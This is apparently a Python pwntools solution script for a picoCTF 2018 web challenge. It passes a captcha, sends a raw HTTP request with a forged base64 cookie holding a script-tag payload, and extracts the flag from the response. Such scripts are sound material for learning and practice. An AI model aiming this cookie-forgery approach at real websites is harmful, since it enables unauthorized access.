#!/usr/bin/python

from pwn import *
import time
import re

s = remote('2018shell.picoctf.com', 18685)

time.sleep(1)
print s.recv(),
captcha = raw_input('')

s.sendline(captcha)
time.sleep(1)

fail = s.recv().strip()

if 'succeeded' in fail:
	print 
	req = '''GET / HTTP/1.1
Host: flag.local
Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D;
'''

	print req
	s.sendline(req)
	time.sleep(1)
	source = s.recv()

	print re.findall(r'(picoCTF\{.+\})', source)[0]
else:
	log.info('Wrong validation!')

s.close()